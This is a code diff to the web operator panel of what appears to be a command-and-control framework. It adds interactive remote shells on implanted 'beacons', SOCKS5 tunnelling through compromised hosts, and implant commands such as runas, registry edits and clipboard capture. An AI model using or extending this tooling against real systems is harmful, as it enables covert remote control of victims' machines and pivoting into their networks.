@@ -86,6 +86,7 @@ function initPanelResizerH() {
         termPanel.style.width = (ratio * 100) + '%';
         logPanel.style.width = ((1 - ratio) * 100) + '%';
         if (_term) _fitAddon.fit();
+        if (_shellTerm && _shellFit) try { _shellFit.fit(); } catch(_) {}
     });
 
     document.addEventListener('mouseup', () => {
@@ -94,6 +95,7 @@ function initPanelResizerH() {
             container.classList.remove('resizing-h');
             document.body.style.cursor = '';
             if (_term) _fitAddon.fit();
+            if (_shellTerm && _shellFit) try { _shellFit.fit(); } catch(_) {}
         }
     });
 }
@@ -111,26 +113,18 @@ let _currentView = 'table';
 
 function setView(view) {
     _currentView = view;
-    const grid = document.getElementById('sessions-grid');
     const tableView = document.getElementById('sessions-table-view');
     const mapView = document.getElementById('map-view');
-    
-    const btnGrid = document.getElementById('btn-view-grid');
+
     const btnTable = document.getElementById('btn-view-table');
     const btnMap = document.getElementById('btn-view-map');
 
-    // Hide all
-    if (grid) grid.style.display = 'none';
     if (tableView) tableView.style.display = 'none';
     if (mapView) mapView.style.display = 'none';
-    
-    // Deactivate all buttons
-    [btnGrid, btnTable, btnMap].forEach(btn => { if (btn) btn.classList.remove('active'); });
 
-    if (view === 'grid') {
-        if (grid) grid.style.display = 'grid';
-        if (btnGrid) btnGrid.classList.add('active');
-    } else if (view === 'table') {
+    [btnTable, btnMap].forEach(btn => { if (btn) btn.classList.remove('active'); });
+
+    if (view === 'table') {
         if (tableView) tableView.style.display = 'block';
         if (btnTable) btnTable.classList.add('active');
         loadSessions();
@@ -151,18 +145,26 @@ function renderTable(beacons) {
 
     tbody.innerHTML = '';
     beacons.slice().sort((a, b) => a.id - b.id).forEach(b => {
+        if (b.shell_active) _activeShells.add(b.id);
+        else _activeShells.delete(b.id);
         const status = beaconStatus(b);
         const os = (PLATFORM_MAP[b.platform] ?? String(b.platform)) + ' ' + (ARCH_MAP[b.arch] ?? String(b.arch));
         const integ = INTEGRITY_MAP[b.integrity] ?? String(b.integrity);
+
+        // Beacon row
+        const socksBadgeHtml = (b.socks_active && b.socks_port)
+            ? ` <span class="badge-socks5">SOCKS5 ${escapeHtml(b.socks_host || '')}:${b.socks_port}</span>`
+            : '';
+
         const tr = document.createElement('tr');
-        
+        tr.dataset.beaconId = b.id;
         tr.innerHTML = `
             <td>
                 <div class="status-cell beacon-${status}">
                     <span class="card-badge badge-${status}">${status.toUpperCase()}</span>
                 </div>
             </td>
-            <td style="color: var(--amber)">${escapeHtml(b.hostname || '?')}</td>
+            <td style="color: var(--amber)">${escapeHtml(b.hostname || '?')} <span class="badge-beacon">BEACON</span>${socksBadgeHtml}</td>
             <td>${escapeHtml(b.username || '—')}</td>
             <td>${escapeHtml(os)}</td>
             <td>${escapeHtml(integ)}</td>
@@ -170,14 +172,59 @@ function renderTable(beacons) {
             <td style="color: var(--blue)">${escapeHtml(b.listener_name || '—')}</td>
             <td>${b.sleep}s</td>
             <td data-ts="${b.last_seen}">${timeAgo(b.last_seen)}</td>
-            <td>
-                <div style="display: flex; gap: 8px;">
-                    <button class="btn-interact" onclick="openTerminal(${b.id})">INTERACT</button>
-                    <button class="${b.alive ? 'btn-kill' : 'btn-delete'}" onclick="showKillModal(${b.id}, '${escapeHtml(b.hostname || '')}', ${!b.alive})">${b.alive ? 'KILL' : 'DELETE'}</button>
-                </div>
-            </td>
         `;
+        tr.addEventListener('contextmenu', (e) => { e.preventDefault(); showContextMenu(e, b); });
+        tr.addEventListener('dblclick', () => openTerminal(b.id));
         tbody.appendChild(tr);
+
+        // Session row (when session TCP is active)
+        if (b.mode === 'session') {
+            const sessRow = document.createElement('tr');
+            sessRow.innerHTML = `
+                <td>
+                    <div class="status-cell beacon-active">
+                        <span class="card-badge badge-active">ACTIVE</span>
+                    </div>
+                </td>
+                <td style="color: #78dce8">${escapeHtml(b.hostname || '?')} <span class="badge-session">SESSION</span></td>
+                <td>${escapeHtml(b.username || '—')}</td>
+                <td>${escapeHtml(os)}</td>
+                <td>${escapeHtml(integ)}</td>
+                <td>${b.process_id}</td>
+                <td style="color: var(--blue)">${escapeHtml(b.listener_name || '—')}</td>
+                <td>realtime</td>
+                <td>—</td>
+            `;
+            sessRow.addEventListener('dblclick', () => openTerminal('sess_' + b.id));
+            sessRow.addEventListener('contextmenu', (e) => { e.preventDefault(); showContextMenu(e, b, false, true); });
+            tbody.appendChild(sessRow);
+        }
+
+        // Shell row (when shell is active for this beacon)
+        if (b.alive && _activeShells.has(b.id)) {
+            const sr = document.createElement('tr');
+            sr.innerHTML = `
+                <td>
+                    <div class="status-cell beacon-active">
+                        <span class="card-badge badge-active">ACTIVE</span>
+                    </div>
+                </td>
+                <td style="color: #AFA9EC">${escapeHtml(b.hostname || '?')} <span class="badge-session">SHELL</span></td>
+                <td>${escapeHtml(b.username || '—')}</td>
+                <td>${escapeHtml(os)}</td>
+                <td>${escapeHtml(integ)}</td>
+                <td>${b.process_id}</td>
+                <td style="color: var(--blue)">${escapeHtml(b.listener_name || '—')}</td>
+                <td>—</td>
+                <td>—</td>
+            `;
+            sr.addEventListener('contextmenu', (e) => {
+                e.preventDefault();
+                showContextMenu(e, b, true);
+            });
+            sr.addEventListener('dblclick', () => openShellTerminal(b.id));
+            tbody.appendChild(sr);
+        }
     });
 }
 
@@ -190,29 +237,125 @@ function hideContextMenu() {
     if (menu) menu.style.display = 'none';
 }
 
-function showContextMenu(e, beacon) {
+function showContextMenu(e, beacon, isShellRow, isSessionRow) {
     e.preventDefault();
     _activeCtxBeacon = beacon;
     const menu = document.getElementById('context-menu');
     if (!menu) return;
 
-    menu.style.display = 'block';
-    menu.style.left = e.clientX + 'px';
-    menu.style.top = e.clientY + 'px';
+    const ctxInteract = document.getElementById('ctx-interact');
+    const ctxSession  = document.getElementById('ctx-session');
+    const ctxKill     = document.getElementById('ctx-kill');
+    const sep         = menu.querySelector('.context-separator');
 
-    document.getElementById('ctx-interact').onclick = () => {
-        openTerminal(beacon.id);
-        hideContextMenu();
-    };
-    document.getElementById('ctx-kill').onclick = () => {
-        showKillModal(beacon.id, beacon.hostname, !beacon.alive);
-        hideContextMenu();
-    };
+    // Remove any previously injected SOCKS5 items
+    menu.querySelectorAll('.ctx-socks-dynamic').forEach(el => el.parentNode.removeChild(el));
+
+    if (isSessionRow) {
+        ctxInteract.textContent = 'Interact';
+        ctxInteract.onclick = () => { openTerminal('sess_' + beacon.id); hideContextMenu(); };
+        ctxSession.style.display = 'none';
+        sep.style.display = '';
+        ctxKill.textContent = 'Close Session';
+        ctxKill.style.display = '';
+        ctxKill.onclick = () => { closeSession(beacon.id); hideContextMenu(); };
+
+        _injectSocksContextItems(menu, sep, beacon);
+    } else if (isShellRow) {
+        ctxInteract.textContent = 'Interact Shell';
+        ctxInteract.onclick = () => { openShellTerminal(beacon.id); hideContextMenu(); };
+        ctxSession.style.display = 'none';
+        sep.style.display = 'none';
+        ctxKill.textContent = 'Close Shell';
+        ctxKill.onclick = () => { stopShell(beacon.id); hideContextMenu(); };
+    } else {
+        ctxInteract.textContent = 'Interact';
+        ctxInteract.onclick = () => { openTerminal(beacon.id); hideContextMenu(); };
+        if (beacon.alive) {
+            ctxSession.style.display = '';
+            sep.style.display = '';
+            ctxSession.onclick = () => { showShellModal(beacon.id, beacon.hostname || ''); hideContextMenu(); };
+        } else {
+            ctxSession.style.display = 'none';
+            sep.style.display = '';
+        }
+        ctxKill.textContent = beacon.alive ? 'Kill Beacon' : 'Delete Beacon';
+        ctxKill.onclick = () => { showKillModal(beacon.id, beacon.hostname, !beacon.alive); hideContextMenu(); };
+    }
+
+    menu.style.display = 'block';
+    const mx = Math.min(e.clientX, window.innerWidth - menu.offsetWidth - 8);
+    const my = Math.min(e.clientY, window.innerHeight - menu.offsetHeight - 8);
+    menu.style.left = mx + 'px';
+    menu.style.top = my + 'px';
+}
+
+function _injectSocksContextItems(menu, insertBefore, beacon) {
+    const tsUrl = getTsUrl();
+    if (!tsUrl) return;
+
+    const b = _beacons[beacon.id] || beacon;
+    const socksActive = !!(b.socks_active);
+
+    const socksItem = document.createElement('div');
+    socksItem.className = 'context-item ctx-socks ctx-socks-dynamic';
+
+    if (socksActive) {
+        socksItem.textContent = 'Stop SOCKS5';
+        socksItem.onclick = () => {
+            authFetch(tsUrl + '/api/socks/' + beacon.id, { method: 'DELETE' })
+                .then(r => {
+                    if (!r.ok) {
+                        r.text().then(t => appendLine('[!] ' + t, 'err'));
+                        return;
+                    }
+                    const bx = _beacons[beacon.id];
+                    if (bx) {
+                        bx.socks_active = false;
+                        bx.socks_host   = '';
+                        bx.socks_port   = 0;
+                    }
+                    removeSocksBadge(beacon.id);
+                })
+                .catch(err => appendLine('[!] socks stop error: ' + err.message, 'err'));
+            hideContextMenu();
+        };
+    } else {
+        socksItem.textContent = 'Start SOCKS5';
+        socksItem.onclick = () => {
+            authFetch(tsUrl + '/api/socks', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ beacon_id: beacon.id }),
+            })
+                .then(r => {
+                    if (!r.ok) {
+                        r.text().then(t => appendLine('[!] ' + t, 'err'));
+                        return null;
+                    }
+                    return r.json();
+                })
+                .then(d => {
+                    if (!d) return;
+                    const bx = _beacons[beacon.id];
+                    if (bx) {
+                        bx.socks_active = true;
+                        bx.socks_host   = d.host || '';
+                        bx.socks_port   = d.port || 0;
+                    }
+                    updateSocksBadge(beacon.id, d.host || '', d.port || 0);
+                })
+                .catch(err => appendLine('[!] socks start error: ' + err.message, 'err'));
+            hideContextMenu();
+        };
+    }
+
+    menu.insertBefore(socksItem, insertBefore);
 }
 
 document.addEventListener('click', hideContextMenu);
 document.addEventListener('contextmenu', (e) => {
-    if (!e.target.closest('.node-victim')) hideContextMenu();
+    if (!e.target.closest('.node-victim') && !e.target.closest('#beacons-table tbody tr')) hideContextMenu();
 });
 
 // ---- Graph Rendering ----
@@ -430,12 +573,13 @@ function saveSettings() {
     updateConnIndicator(!!ip);
     
     // Refresh current view
-    if (document.getElementById('sessions-grid')) loadSessions();
+    if (document.getElementById('sessions-table-view')) loadSessions();
     if (document.getElementById('listeners-tbody')) loadListeners();
     if (document.getElementById('build-btn')) populateBuildListeners();
 }
 
 function initSettings() {
+    ensureSettingsModal();
     const ipEl   = document.getElementById('tsIp');
     const portEl = document.getElementById('tsPort');
     if (ipEl)   ipEl.value   = localStorage.getItem('tsIp')   || '';
@@ -443,11 +587,134 @@ function initSettings() {
     updateConnIndicator(!!(localStorage.getItem('tsIp') || ''));
 }
 
+function ensureSettingsModal() {
+    if (document.getElementById('settings-modal')) return;
+    const wrap = document.createElement('div');
+    wrap.innerHTML = [
+        '<div id="settings-modal" class="modal-backdrop" hidden>',
+        '  <div class="modal-card" role="dialog" aria-modal="true" aria-labelledby="settings-title">',
+        '    <span class="modal-tab">// connection</span>',
+        '    <button type="button" class="modal-close" aria-label="Close">×</button>',
+        '    <h3 id="settings-title" class="modal-title">Teamserver</h3>',
+        '    <p class="modal-subtitle">route operator traffic to the C2 frame</p>',
+        '    <div class="modal-row">',
+        '      <div class="modal-field">',
+        '        <label for="tsIp">host</label>',
+        '        <input id="tsIp" type="text" placeholder="192.168.1.100" autocomplete="off" spellcheck="false">',
+        '      </div>',
+        '      <div class="modal-field modal-field-narrow">',
+        '        <label for="tsPort">port</label>',
+        '        <input id="tsPort" type="text" placeholder="8080" autocomplete="off" spellcheck="false">',
+        '      </div>',
+        '    </div>',
+        '    <div class="modal-footer">',
+        '      <a href="#" class="modal-logout" data-action="logout" title="Log out of this session">',
+        '        <svg class="modal-logout-svg" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>',
+        '        <span>jack out</span>',
+        '      </a>',
+        '      <div class="modal-actions">',
+        '        <button type="button" class="btn-ghost" data-action="cancel">cancel</button>',
+        '        <button type="button" data-action="save">connect</button>',
+        '      </div>',
+        '    </div>',
+        '  </div>',
+        '</div>'
+    ].join('');
+    const modal = wrap.firstElementChild;
+    document.body.appendChild(modal);
+
+    modal.addEventListener('click', (e) => {
+        if (e.target === modal) closeSettings();
+    });
+    modal.querySelector('.modal-close').addEventListener('click', closeSettings);
+    modal.querySelector('[data-action="cancel"]').addEventListener('click', closeSettings);
+    modal.querySelector('[data-action="save"]').addEventListener('click', () => {
+        saveSettings();
+        closeSettings();
+    });
+    modal.querySelector('[data-action="logout"]').addEventListener('click', (e) => {
+        e.preventDefault();
+        logout();
+    });
+
+    document.addEventListener('keydown', (e) => {
+        if (modal.hidden) return;
+        if (e.key === 'Escape') { e.preventDefault(); closeSettings(); }
+        else if (e.key === 'Enter') { e.preventDefault(); saveSettings(); closeSettings(); }
+    });
+}
+
+function openSettings() {
+    ensureSettingsModal();
+    const modal = document.getElementById('settings-modal');
+    const ip    = document.getElementById('tsIp');
+    const port  = document.getElementById('tsPort');
+    if (ip)   ip.value   = localStorage.getItem('tsIp')   || '';
+    if (port) port.value = localStorage.getItem('tsPort')  || '8080';
+    modal.hidden = false;
+    requestAnimationFrame(() => modal.classList.add('open'));
+    setTimeout(() => {
+        if (ip && !ip.value) ip.focus();
+        else if (ip) ip.select();
+    }, 40);
+}
+
+function closeSettings() {
+    const modal = document.getElementById('settings-modal');
+    if (!modal || modal.hidden) return;
+    modal.classList.remove('open');
+    setTimeout(() => { modal.hidden = true; }, 180);
+}
+
 function updateConnIndicator(connected) {
     const dot    = document.getElementById('conn-dot');
     const status = document.getElementById('conn-status');
     if (dot)    dot.className    = 'conn-dot' + (connected ? ' connected' : '');
     if (status) status.textContent = connected ? 'CONNECTED' : 'OFFLINE';
+}
+
+// ---- Auth ----
+
+async function authFetch(url, options = {}) {
+    const token = localStorage.getItem('authToken');
+    if (token) {
+        if (!options.headers) options.headers = {};
+        if (options.headers instanceof Headers) {
+            options.headers.set('Authorization', 'Bearer ' + token);
+        } else {
+            options.headers['Authorization'] = 'Bearer ' + token;
+        }
+    }
+    const resp = await fetch(url, options);
+    if (resp.status === 401) {
+        localStorage.removeItem('authToken');
+        window.location.href = '/login';
+        throw new Error('unauthorized');
+    }
+    return resp;
+}
+
+function checkAuth() {
+    const token = localStorage.getItem('authToken');
+    if (!token) {
+        window.location.href = '/login';
+        return false;
+    }
+    return true;
+}
+
+async function logout() {
+    const token = localStorage.getItem('authToken');
+    if (token) {
+        try {
+            await fetch('/api/auth/logout', {
+                method: 'POST',
+                headers: { 'Authorization': 'Bearer ' + token }
+            });
+        } catch (_) {}
+    }
+    localStorage.removeItem('authToken');
+    window.location.href = '/login';
 }
 
 // ---- Client-side help ----
@@ -502,7 +769,11 @@ const HELP_TEXT = [
     '',
     '[ 08. BEACON CONTROL ]',
     '  sleep <sec> [jit]   Adjust check-in interval and jitter %',
-    '  exit                Terminate the beacon session',
+    '  interactive         Upgrade to persistent TCP session (real-time)',
+    '  shell               Open interactive shell (requires session mode)',
+    '  socks5 start [port] Start SOCKS5 proxy tunnel (requires session mode)',
+    '  socks5 stop         Stop active SOCKS5 proxy tunnel',
+    '  exit                Terminate the beacon process',
     '',
     '[ 09. EXECUTION MODES ]',
     '  runas <user> <pass> <cmd>  Run command as another user (no runas.exe)',
@@ -531,8 +802,8 @@ const VALID_COMMANDS = [
     'ipconfig', 'arp', 'netstat', 'dns',
     'privs', 'groups', 'services', 'uptime',
     'reg_query', 'reg_set', 'clipboard', 'runas',
-    'shell', 'sleep', 'exit', 'help', 'clear',
-    'download', 'upload',
+    'shell', 'sleep', 'interactive', 'exit', 'help', 'clear',
+    'download', 'upload', 'socks5',
 ];
 
 const ARCH_MAP      = ['x86', 'x64', 'arm', 'arm64'];
@@ -598,7 +869,7 @@ async function confirmKill() {
     const tsUrl = getTsUrl();
     if (!tsUrl) return;
     try {
-        await fetch(tsUrl + '/api/sessions/' + id, { method: 'DELETE' });
+        await authFetch(tsUrl + '/api/sessions/' + id, { method: 'DELETE' });
     } catch (e) {
         console.error('kill beacon:', e);
     }
@@ -634,23 +905,639 @@ function showToast(hostname, username) {
 
 let _knownBeaconIds    = null;
 let _knownBeaconAlive  = {};
-let _sessionsInterval  = null;
-let _eventLogInterval  = null;
-let _lootInterval      = null;
-let _listenersInterval = null;
+let _beacons           = {};
+let sessionWs          = null;
+const _beaconModes     = {};
+
+function _actualBid() {
+    if (typeof beaconId === 'string') {
+        if (beaconId.startsWith('sess_')) return parseInt(beaconId.slice(5), 10);
+        if (beaconId.startsWith('shell_')) return parseInt(beaconId.slice(6), 10);
+    }
+    return beaconId;
+}
+
+function _isSessionTab() {
+    return typeof beaconId === 'string' && beaconId.startsWith('sess_');
+}
+
+// Shell tab state (separate xterm instance)
+let _shellTerm        = null;
+let _shellFit         = null;
+let _shellWsMap       = new Map();
+let _activeShellBid   = null;
 
 function beaconStatus(b) {
     if (!b.alive) return 'dead';
     return 'active';
 }
 
+function connectSessionWs(bid) {
+    if (sessionWs) { sessionWs.close(); sessionWs = null; }
+    const tsUrl = getTsUrl();
+    if (!tsUrl) return;
+    const wsProto = tsUrl.startsWith('https') ? 'wss' : 'ws';
+    const wsHost = tsUrl.replace(/^https?:\/\//, '');
+    const token = localStorage.getItem('authToken') || '';
+    const url = wsProto + '://' + wsHost + '/ws/session/' + bid + '?token=' + encodeURIComponent(token);
+    sessionWs = new WebSocket(url);
+
+    sessionWs.onmessage = function(event) {
+        try {
+            const data = JSON.parse(event.data);
+            if (data.label && !_tabLabels[data.label]) return;
+            if (data.label && _tabLabels[data.label] !== beaconId) return;
+            if (data.output) {
+                appendLine(data.output, 'out');
+            }
+        } catch (e) { /* ignore parse errors */ }
+    };
+
+    sessionWs.onclose = function() {
+        sessionWs = null;
+    };
+
+    sessionWs.onerror = function() {
+        if (sessionWs) { sessionWs.close(); sessionWs = null; }
+    };
+}
+
+// ---- Session mode modal ----
+
+let _sessionTargetId = null;
+
+function showShellModal(bid, hostname) {
+    _sessionTargetId = bid;
+    const el = document.getElementById('session-modal-target');
+    if (el) el.textContent = hostname || ('beacon #' + bid);
+    const modal = document.getElementById('session-modal');
+    if (modal) modal.style.display = 'flex';
+}
+
+function showSessionModal(bid, hostname) { showShellModal(bid, hostname); }
+
+function cancelSession() {
+    _sessionTargetId = null;
+    const modal = document.getElementById('session-modal');
+    if (modal) modal.style.display = 'none';
+}
+
+function confirmSession() {
+    const bid = _sessionTargetId;
+    cancelSession();
+    if (bid == null) return;
+    requestInteractive(bid);
+}
+
+async function closeSession(bid) {
+    const tsUrl = getTsUrl();
+    if (!tsUrl) return;
+    try {
+        const resp = await authFetch(tsUrl + '/api/session/' + bid, { method: 'DELETE' });
+        if (!resp.ok) {
+            const txt = await resp.text();
+            appendLine('[!] ' + txt, 'err');
+        }
+    } catch (e) { /* ignore */ }
+}
+
+async function requestInteractive(bid) {
+    const tsUrl = getTsUrl();
+    if (!tsUrl) return false;
+    try {
+        const resp = await authFetch(tsUrl + '/api/interactive', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ beacon_id: bid, port: 4443 })
+        });
+        if (resp.ok) {
+            appendLine(PROMPT_STR + 'interactive', 'cmd-echo');
+            appendLine('[*] interactive session requested — beacon will connect on next checkin', 'info');
+            return true;
+        } else {
+            const txt = await resp.text();
+            appendLine('[!] ' + txt, 'err');
+            return false;
+        }
+    } catch (e) {
+        appendLine('[!] interactive request error: ' + e.message, 'err');
+        return false;
+    }
+}
+
+function stopShell(bid) {
+    const tsUrl = getTsUrl();
+    if (!tsUrl) return;
+    authFetch(tsUrl + '/api/task', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ beacon_id: bid, type: 24, code: 0, args: '' })
+    }).catch(function(){});
+    _activeShells.delete(bid);
+    const entry = _shellWsMap.get(bid);
+    if (entry && entry.ws) { entry.ws.close(); }
+    _shellWsMap.delete(bid);
+    const tabKey = 'shell_' + bid;
+    if (_openTabs.has(tabKey)) {
+        _openTabs.delete(tabKey);
+        if (beaconId === tabKey) {
+            beaconId = null;
+            const shellEl = document.getElementById('shell-terminal');
+            if (shellEl) shellEl.style.display = 'none';
+        }
+    }
+    _renderTabs();
+    _saveTabs();
+}
+
+function openShellTerminal(bid) {
+    const tsUrl = getTsUrl();
+    if (!tsUrl) return;
+
+    const tabKey = 'shell_' + bid;
+
+    // If shell tab already exists, just switch to it
+    if (_openTabs.has(tabKey)) {
+        _switchTab(tabKey);
+        document.body.classList.add('panel-open');
+        return;
+    }
+
+    // Save current beacon state
+    _saveBeaconState(beaconId);
+
+    // Create shell xterm if first time
+    if (!_shellTerm) _initShellXterm();
+
+    // Set active tab
+    beaconId = tabKey;
+    _activeShellBid = bid;
+
+    // Show shell terminal, hide beacon terminal
+    const termEl = document.getElementById('terminal');
+    const shellEl = document.getElementById('shell-terminal');
+    if (termEl) termEl.style.display = 'none';
+    if (shellEl) shellEl.style.display = '';
+
+    _shellTerm.clear();
+    _shellTerm.write('\x1b[2J\x1b[H');
+
+    document.body.classList.add('panel-open');
+
+    if (sessionWs) { sessionWs.close(); sessionWs = null; }
+
+    if (_activeShells.has(bid)) {
+        // Reconnect to existing shell — skip mode detection, just open WebSocket
+        const entry = _shellWsMap.get(bid);
+        if (entry) { entry.localEcho = false; entry.modeSet = true; }
+        _shellTerm.write('\x1b[90m[reconnecting to shell...]\x1b[0m\r\n');
+        _connectShellWs(bid);
+    } else {
+        // First time — send TASK_SHELL_START
+        authFetch(tsUrl + '/api/task', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ beacon_id: bid, type: 21, code: 0, args: '' })
+        }).then(resp => {
+            if (!resp.ok) {
+                _shellTerm.write('\x1b[31m[failed to start shell]\x1b[0m\r\n');
+                return;
+            }
+            _shellTerm.write('\r\n\x1b[33mConnection will be established on next callback...\x1b[0m\r\n');
+            _activeShells.add(bid);
+            _connectShellWs(bid);
+        });
+    }
+
+    // Add tab
+    _openTabs.set(tabKey, { hostname: 'SHELL', shellBid: bid });
+    _fetchShellTabHostname(tabKey, bid);
+    _renderTabs();
+    _saveTabs();
+    _shellTerm.focus();
+}
+
+function _initShellXterm() {
+    let el = document.getElementById('shell-terminal');
+    if (!el) {
+        el = document.createElement('div');
+        el.id = 'shell-terminal';
+        el.style.display = 'none';
+        const termEl = document.getElementById('terminal');
+        if (termEl && termEl.parentNode) {
+            termEl.parentNode.insertBefore(el, termEl.nextSibling);
+        }
+    }
+
+    _shellTerm = new Terminal({
+        fontFamily: "'Share Tech Mono', 'Courier New', monospace",
+        fontSize: 14, letterSpacing: 0.5, lineHeight: 1.4,
+        cursorBlink: true, cursorStyle: 'block',
+        scrollback: 5000, allowTransparency: true,
+        convertEol: true,
+        theme: {
+            background: '#000000', foreground: '#d4d4d4',
+            cursor: '#c84b31', cursorAccent: '#000000',
+            selectionBackground: 'rgba(200,75,49,0.25)',
+            black:'#000000', red:'#c84b31', green:'#4a90a4', yellow:'#ffb000',
+            blue:'#4a90a4', magenta:'#c84b31', cyan:'#4a90a4', white:'#e8d5a3',
+        },
+    });
+
+    _shellFit = new FitAddon.FitAddon();
+    _shellTerm.loadAddon(_shellFit);
+    _shellTerm.open(el);
+    try { _shellFit.fit(); } catch(_) {}
+    new ResizeObserver(() => { try { _shellFit.fit(); } catch(_) {} }).observe(el);
+
+    _shellTerm.onData(function(data) {
+        const entry = _shellWsMap.get(_activeShellBid);
+        if (entry && entry.ws && entry.ws.readyState === WebSocket.OPEN) {
+            if (entry.localEcho) {
+                _shellTerm.write(data);
+                data = data.replace(/\r/g, '\r\n');
+            }
+            entry.ws.send(data);
+        }
+    });
+}
+
+function _connectShellWs(bid) {
+    const tsUrl = getTsUrl();
+    if (!tsUrl) return;
+
+    const existing = _shellWsMap.get(bid);
+    if (existing && existing.ws && existing.ws.readyState <= WebSocket.OPEN) return;
+
+    const wsProto = tsUrl.startsWith('https') ? 'wss' : 'ws';
+    const wsHost = tsUrl.replace(/^https?:\/\//, '');
+    const token = localStorage.getItem('authToken') || '';
+    const ws = new WebSocket(wsProto + '://' + wsHost + '/ws/shell/' + bid + '?token=' + encodeURIComponent(token));
+    ws.binaryType = 'arraybuffer';
+
+    const entry = { ws: ws, buffer: [], localEcho: false, modeSet: false };
+    _shellWsMap.set(bid, entry);
+
+    ws.onopen = function() {
+        if (entry.modeSet && _shellTerm && _activeShellBid === bid) {
+            _shellTerm.write('\x1b[32m[shell reconnected]\x1b[0m\r\n');
+            ws.send('\r');
+        }
+        if (_shellTerm && _activeShellBid === bid) _shellTerm.focus();
+    };
+
+    ws.onmessage = function(event) {
+        let data = event.data instanceof ArrayBuffer
+            ? new TextDecoder().decode(event.data) : event.data;
+
+        if (!entry.modeSet) {
+            entry.modeSet = true;
+            if (data.startsWith('[conpty]\n')) {
+                entry.localEcho = false;
+                data = data.slice(9);
+            } else if (data.startsWith('[pipes]\n')) {
+                entry.localEcho = true;
+                data = data.slice(8);
+            }
+            if (!data) return;
+        }
+
+        if (_activeShellBid === bid && _shellTerm) {
+            _shellTerm.write(data, function() { _shellTerm.scrollToBottom(); });
+        } else {
+            entry.buffer.push(data);
+        }
+    };
+
+    ws.onclose = function() {
+        _shellWsMap.delete(bid);
+        if (_activeShellBid === bid && _shellTerm) {
+            _shellTerm.write('\r\n\x1b[90m[shell disconnected — close tab or click SHELL to reopen]\x1b[0m\r\n');
+        }
+    };
+
+    ws.onerror = function() {
+        if (ws.readyState !== WebSocket.CLOSED) ws.close();
+    };
+}
+
+async function _fetchShellTabHostname(tabKey, bid) {
+    const tsUrl = getTsUrl();
+    if (!tsUrl) return;
+    try {
+        const resp = await authFetch(tsUrl + '/api/sessions');
+        const beacons = await resp.json();
+        const b = beacons.find(x => x.id === bid);
+        if (b && b.hostname) {
+            const tab = _openTabs.get(tabKey);
+            if (tab) { tab.hostname = b.hostname; _renderTabs(); _saveTabs(); }
+        }
+    } catch(_) {}
+}
+
+function _renderSessionsList(beacons) {
+    const noMsg = document.getElementById('no-sessions');
+
+    updateConnIndicator(true);
+
+    const aliveBeacons = beacons.filter(b => b.alive).length;
+    const titleEl = document.getElementById('sessions-title');
+    if (titleEl) {
+        titleEl.innerHTML = `Sessions <span class="count-minimal">// ${aliveBeacons} active</span>`;
+    }
+
+    if (_currentView === 'map') {
+        renderMap(beacons);
+    } else if (_currentView === 'table') {
+        renderTable(beacons);
+    }
+
+    if (beacons.length === 0) {
+        if (noMsg && _currentView !== 'map') {
+            noMsg.innerHTML = 'No active beacons.' +
+                '<span class="empty-quote">"You\'re gonna carry that weight."</span>';
+            noMsg.style.display = '';
+        } else if (noMsg) {
+            noMsg.style.display = 'none';
+        }
+        if (_knownBeaconIds === null) _knownBeaconIds = new Set();
+        return;
+    }
+    if (noMsg) noMsg.style.display = 'none';
+
+    // Toast + event log for new beacons
+    if (_knownBeaconIds === null) {
+        _knownBeaconIds = new Set();
+        _knownBeaconAlive = {};
+        for (const b of beacons) {
+            _knownBeaconIds.add(b.id);
+            _knownBeaconAlive[b.id] = b.alive;
+            _beaconModes[b.id] = b.mode || 'beacon';
+        }
+    } else {
+        for (const b of beacons) {
+            if (!_knownBeaconIds.has(b.id)) {
+                _knownBeaconIds.add(b.id);
+                _knownBeaconAlive[b.id] = b.alive;
+                showToast(b.hostname || '?', b.username || '?');
+            }
+            _knownBeaconAlive[b.id] = b.alive;
+            _beaconModes[b.id] = b.mode || 'beacon';
+        }
+    }
+}
+
+function _renderSessionsFromCache() {
+    _renderSessionsList(Object.values(_beacons));
+}
+
+// ── Operator WebSocket (replaces polling) ──────────────────────────
+let _operatorWs = null;
+let _wsReconnectDelay = 1000;
+let _wsReconnectTimer = null;
+
+function connectOperatorWs() {
+    if (_operatorWs && _operatorWs.readyState <= WebSocket.OPEN) return;
+
+    const tsUrl = getTsUrl();
+    if (!tsUrl) return;
+    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+    const host = tsUrl.replace(/^https?:\/\//, '');
+    const token = localStorage.getItem('authToken') || '';
+    const wsUrl = `${proto}//${host}/ws/operator?token=${encodeURIComponent(token)}`;
+    _operatorWs = new WebSocket(wsUrl);
+
+    _operatorWs.onopen = () => {
+        console.log('[ws] operator connected');
+        _wsReconnectDelay = 1000;
+    };
+
+    _operatorWs.onclose = () => {
+        console.log('[ws] operator disconnected, reconnecting in', _wsReconnectDelay, 'ms');
+        _operatorWs = null;
+        _wsReconnectTimer = setTimeout(() => {
+            connectOperatorWs();
+        }, _wsReconnectDelay);
+        _wsReconnectDelay = Math.min(_wsReconnectDelay * 2, 30000);
+    };
+
+    _operatorWs.onerror = () => {};
+
+    _operatorWs.onmessage = (ev) => {
+        let msg;
+        try { msg = JSON.parse(ev.data); } catch { return; }
+        _handleWsMessage(msg);
+    };
+}
+
+function _handleWsMessage(msg) {
+    const { topic, action, data } = msg;
+    switch (topic) {
+        case 'sessions':
+            _handleSessionsMsg(action, data);
+            break;
+        case 'results':
+            _handleResultsMsg(action, data);
+            break;
+        case 'events':
+            _handleEventsMsg(action, data);
+            break;
+        case 'loot':
+            _handleLootMsg(action, data);
+            break;
+        case 'listeners':
+            _handleListenersMsg(action, data);
+            break;
+        case 'socks':
+            _handleSocksMsg(action, data);
+            break;
+        case 'chat':
+            _handleChatMsg(action, data);
+            break;
+    }
+}
+
+function _handleSessionsMsg(action, data) {
+    if (action === 'sync') {
+        _beacons = {};
+        if (Array.isArray(data)) {
+            data.forEach(b => { _beacons[b.id] = b; });
+        }
+        _renderSessionsFromCache();
+        _refreshOpenTabHostnames();
+        return;
+    }
